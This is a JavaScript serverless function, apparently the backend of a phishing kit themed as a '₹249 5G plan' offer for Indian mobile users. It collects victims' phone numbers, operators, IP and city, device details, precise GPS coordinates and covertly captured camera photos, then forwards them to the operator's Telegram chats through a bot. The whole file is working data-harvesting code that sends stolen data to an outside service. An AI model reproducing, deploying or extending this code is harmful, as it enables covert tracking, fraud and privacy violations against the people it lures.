const axios = require('axios');
const FormData = require('form-data');

module.exports = async (req, res) => {
  // Vercel specific CORS - allow all origins for testing
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  
  // Vercel automatically handles OPTIONS for CORS
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // For testing on Vercel
  if (req.method === 'GET') {
    return res.status(200).json({
      success: true,
      message: '✅ Telegram API on Vercel is working!',
      platform: 'Vercel Serverless',
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development'
    });
  }
  
  // Main POST handler
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }
  
  try {
    // ✅ VERCEL ENVIRONMENT VARIABLES
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const MAIN_CHAT_ID = process.env.MAIN_CHAT_ID;
    const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
    
    console.log('🔧 Vercel Environment Check:', {
      hasBotToken: !!BOT_TOKEN,
      hasMainChatId: !!MAIN_CHAT_ID,
      hasIpinfoToken: !!IPINFO_TOKEN,
      nodeEnv: process.env.NODE_ENV
    });
    
    if (!BOT_TOKEN || !MAIN_CHAT_ID) {
      console.error('❌ Vercel Env Vars Missing:', { BOT_TOKEN: !!BOT_TOKEN, MAIN_CHAT_ID: !!MAIN_CHAT_ID });
      return res.status(500).json({
        success: false,
        error: 'Server configuration missing on Vercel.',
        help: 'Set BOT_TOKEN and MAIN_CHAT_ID in Vercel Project Settings > Environment Variables'
      });
    }
    
    // Parse request body
    let userData = {};
    try {
      userData = req.body;
      console.log('📥 Vercel - Received data:', {
        mobile: userData.mobile,
        operator: userData.operator,
        hasPhoto: !!userData.photo,
        photoType: typeof userData.photo,
        photoLength: userData.photo ? userData.photo.length : 0,
        userChatId: userData.userChatId || 'Not provided'
      });
      
      // Debug: Log first 100 chars of photo data if exists
      if (userData.photo && typeof userData.photo === 'string') {
        console.log('📷 Photo data preview:', userData.photo.substring(0, 100) + '...');
      }
    } catch (e) {
      console.error('❌ JSON parse error on Vercel:', e);
      return res.status(400).json({ 
        error: 'Invalid JSON in request body',
        platform: 'Vercel'
      });
    }
    
    // Fixed to India
    userData.country = '+91';
    const USER_CHAT_ID = userData.userChatId || MAIN_CHAT_ID;
    
    // Get client IP (Vercel specific)
    const clientIp = req.headers['x-forwarded-for'] || 
                     req.headers['x-real-ip'] || 
                     req.connection.remoteAddress ||
                     req.socket.remoteAddress;
    
    console.log('🌐 Client IP on Vercel:', clientIp);
    
    // IP Info (optional)
    let ipInfoData = { ip: clientIp || 'Unknown' };
    if (IPINFO_TOKEN) {
      try {
        const ipResponse = await axios.get(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`, {
          timeout: 3000
        });
        ipInfoData = ipResponse.data;
      } catch (ipError) {
        console.log('⚠️ IPInfo failed, using basic IP only');
      }
    }
    
    // ✅ PHOTO PROCESSING FOR VERCEL
    let photoStatus = 'Not Captured';
    let canSendPhoto = false;
    let photoBuffer = null;
    let photoFilename = null;
    
    if (userData.photo) {
      if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
        console.log('🔄 Processing base64 image on Vercel...');
        
        try {
          // Extract base64 part
          const matches = userData.photo.match(/^data:image\/(\w+);base64,(.+)$/);
          if (!matches || matches.length !== 3) {
            console.error('❌ Invalid base64 format');
            photoStatus = 'Invalid Base64 Format';
          } else {
            const imageType = matches[1]; // jpeg, png, etc
            const base64Data = matches[2];
            
            // Convert to buffer
            photoBuffer = Buffer.from(base64Data, 'base64');
            const bufferSizeKB = Math.round(photoBuffer.length / 1024);
            
            console.log(`📏 Vercel - Photo Buffer: ${bufferSizeKB}KB, Type: ${imageType}`);
            
            // Telegram limits: 10MB for photos
            if (bufferSizeKB > 10000) {
              console.log(`⚠️ Photo too large for Telegram: ${bufferSizeKB}KB`);
              photoStatus = `Captured (${bufferSizeKB}KB - Too Large)`;
            } else if (bufferSizeKB < 10) {
              console.log(`⚠️ Photo too small: ${bufferSizeKB}KB`);
              photoStatus = `Captured (${bufferSizeKB}KB - Too Small)`;
            } else {
              canSendPhoto = true;
              photoStatus = `Captured ✓ (${bufferSizeKB}KB)`;
              photoFilename = `photo_${userData.mobile}_${Date.now()}.${imageType === 'jpeg' ? 'jpg' : imageType}`;
              console.log(`✅ Photo ready for Telegram: ${bufferSizeKB}KB`);
            }
          }
        } catch (convertError) {
          console.error('❌ Base64 conversion failed on Vercel:', convertError.message);
          photoStatus = 'Conversion Failed';
        }
      } 
      else if (typeof userData.photo === 'object') {
        if (userData.photo.status === 'Permission Denied') {
          photoStatus = 'Permission Denied';
          console.log('📸 Camera permission denied by user');
        } else {
          photoStatus = 'Unexpected Object Format';
          console.log('📸 Unexpected photo object:', userData.photo);
        }
      }
      else {
        photoStatus = 'Unknown Format';
        console.log('📸 Unknown photo format type:', typeof userData.photo);
      }
    }
    
    // ✅ TELEGRAM MESSAGE
    const message = `
💰 *₹249 5G PLAN ACTIVATED*
📱 Mobile: +${userData.country.replace('+', '')}${userData.mobile}
📡 Operator: ${userData.operator}

🌐 *IP Information:*
🌐 IP Address: ${ipInfoData.ip || 'Unknown'}
📡 ISP: ${ipInfoData.org || 'Unknown'}
📍 City: ${ipInfoData.city || 'Unknown'}
🗺️ Region: ${ipInfoData.region || 'Unknown'}
🌍 Country: ${ipInfoData.country || 'Unknown'}

📱 *Device Info:*
🔋 Charging: ${userData.deviceInfo?.battery?.charging ? 'Yes' : 'No'}
🔌 Battery Level: ${userData.deviceInfo?.battery?.level || 'N/A'}%
🌐 Network Type: ${userData.deviceInfo?.connection?.effectiveType || 'N/A'}
🕒 Time Zone: ${userData.deviceInfo?.timezone || 'N/A'}
🖥️ User Agent: ${userData.deviceInfo?.userAgent || 'N/A'}

📍 *Location:* ${userData.location?.latitude ? 
`Latitude: ${userData.location.latitude}
Longitude: ${userData.location.longitude}
Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) + 'm' : 'N/A'}
🌍 View on Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}` : 
'Permission Denied'}

📸 *Camera:* ${photoStatus}

🔗 *URL:* ${userData.deviceInfo?.url || 'N/A'}
⏰ *Time:* ${new Date().toLocaleString('en-IN')}
🖥️ *Host:* Vercel Serverless
    `;
    
    // ✅ SEND TO TELEGRAM
    const chatIds = [...new Set([MAIN_CHAT_ID, USER_CHAT_ID].filter(id => id))];
    const results = [];
    
    console.log(`📤 Vercel - Sending to ${chatIds.length} chats:`, chatIds);
    
    for (const chatId of chatIds) {
      try {
        console.log(`🔄 Processing chat ${chatId}...`);
        
        // 1. Send Message
        const messageResponse = await axios.post(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
          },
          { 
            timeout: 10000,
            headers: {
              'Content-Type': 'application/json'
            }
          }
        );
        
        console.log(`✅ Message sent to ${chatId}, Message ID: ${messageResponse.data.result?.message_id}`);
        
        // 2. Send Photo if available
        if (canSendPhoto && photoBuffer && photoFilename) {
          try {
            console.log(`🖼️ Attempting to send photo to ${chatId}...`);
            
            // Create FormData for photo upload
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoBuffer, {
              filename: photoFilename,
              contentType: 'image/jpeg',
              knownLength: photoBuffer.length
            });
            formData.append('caption', `📸 Verification for ${userData.mobile} (${Math.round(photoBuffer.length/1024)}KB)`);
            formData.append('disable_notification', false);
            
            const formHeaders = formData.getHeaders();
            
            const photoResponse = await axios.post(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
              formData,
              {
                timeout: 30000, // 30 seconds for photo upload
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                headers: {
                  ...formHeaders,
                  'Content-Length': formData.getLengthSync()
                }
              }
            );
            
            console.log(`✅ Photo sent to ${chatId}, Photo ID: ${photoResponse.data.result?.photo?.[0]?.file_id}`);
            
          } catch (photoError) {
            console.error(`❌ Vercel Photo Upload Error to ${chatId}:`, {
              status: photoError.response?.status,
              statusText: photoError.response?.statusText,
              data: photoError.response?.data,
              message: photoError.message,
              bufferSize: photoBuffer?.length
            });
            
            // Fallback: Send message about photo
            await axios.post(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
              {
                chat_id: chatId,
                text: `📸 Photo captured for ${userData.mobile} (${Math.round(photoBuffer.length/1024)}KB) but upload failed.\nError: ${photoError.response?.data?.description || photoError.message}`
              },
              { timeout: 5000 }
            );
          }
        } 
        // 3. Handle permission denied case
        else if (photoStatus === 'Permission Denied') {
          await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
              chat_id: chatId,
              text: `📸 Camera permission denied by user: ${userData.mobile}`
            },
            { timeout: 5000 }
          );
          console.log(`📸 Permission denied message sent to ${chatId}`);
        }
        
        results.push({ 
          chatId, 
          success: true,
          messageSent: true,
          photoSent: canSendPhoto && photoBuffer ? true : false
        });
        
        // Delay between messages to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 800));
        
      } catch (error) {
        console.error(`❌ Vercel Telegram Error for ${chatId}:`, {
          status: error.response?.status,
          statusText: error.response?.statusText,
          data: error.response?.data,
          message: error.message
        });
        
        results.push({ 
          chatId, 
          success: false, 
          error: error.response?.data?.description || error.message,
          code: error.response?.status
        });
      }
    }
    
    // ✅ SUCCESS RESPONSE
    res.status(200).json({ 
      success: true, 
      message: 'Data processed on Vercel successfully!',
      platform: 'Vercel Serverless',
      sentToChatIds: chatIds,
      results: results,
      photoInfo: {
        status: photoStatus,
        couldSend: canSendPhoto,
        bufferSize: photoBuffer ? Math.round(photoBuffer.length / 1024) + 'KB' : null
      },
      timestamp: new Date().toISOString(),
      vercelRegion: process.env.VERCEL_REGION || 'unknown'
    });
    
  } catch (error) {
    console.error('❌ Vercel Serverless Function Error:', {
      message: error.message,
      stack: error.stack,
      code: error.code,
      response: error.response?.data
    });
    
    res.status(500).json({ 
      success: false, 
      error: 'Vercel serverless function error',
      message: error.message,
      platform: 'Vercel',
      timestamp: new Date().toISOString()
    });
  }
};
